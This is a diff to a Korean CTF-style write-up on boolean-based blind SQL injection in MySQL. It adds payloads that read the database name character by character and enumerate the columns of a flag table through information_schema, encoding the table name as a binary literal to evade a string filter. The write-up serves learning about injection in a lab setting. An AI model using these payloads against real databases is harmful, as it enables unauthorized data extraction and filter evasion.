@@ -104,7 +104,7 @@ Boolean Based SQL Injection 이 가능하다.
 
 - if(ord(substr(database(),1,1))in(<입력>),1,0)
 
-  substr(string,start,offset)을 이용하여 데이터베이스 명을 1글자씩 알아낸다.
+  substr(string,start,offset)을 이용하여 데이터베이스 명을 1글 자씩 알아낸다.
 
   if((substr(database(),1,1))in("c"),1,0)은 문자열이 필터링되므로 쓸 수 없다.
 
@@ -276,17 +276,18 @@ __select(if((table_name)in(<테이블이름>), column_name, null))from(informati
 
 <br>
 
-- 튜플 수
+- Column 수
 
-  if(select(count(if((table_name)in("FLAG_AB733768"),column_name,null)))from(information_schema.columns))in(1),1,0)
+  if((select(count(if((table_name)in('FLAG_AB733768'),column_name,null)))from(information_schema.columns))in(1),1,0)
 
   "FLAG_AB733768"는 필터링 되므로 바이너리로 바꾸어 준다.
   
-  =0b010001100100110001000001010001110101111101000001010000100011011100110011001100110011011100110110 00111000
+  =0b01000110010011000100000101000111010111110100000101000010001101110011001100110011001101110011011000111000
+  
+  __if((select(count(if((table_name)in(0b01000110010011000100000101000111010111110100000101000010001101110011001100110011001101110011011000111000),column_name,null)))from(information_schema.columns))in(1),1,0)__ 
+  
+- Column 이름
 
-
+  __if(ord(substr((select(min(if((table_name)in(<테이블 이름>),column_name,null)))from(information_schema.columns)),1,1))in(<입력>),1,0)__
 
 https://nalara12200.tistory.com/14
-
-if(select(count(if((table_name)in(0b01000110010011000100000101000111010111110100000101000010001101110011001100110011001101110011011000111000),column_name,null)))from(information_schema.columns))in(2),1,0)
-
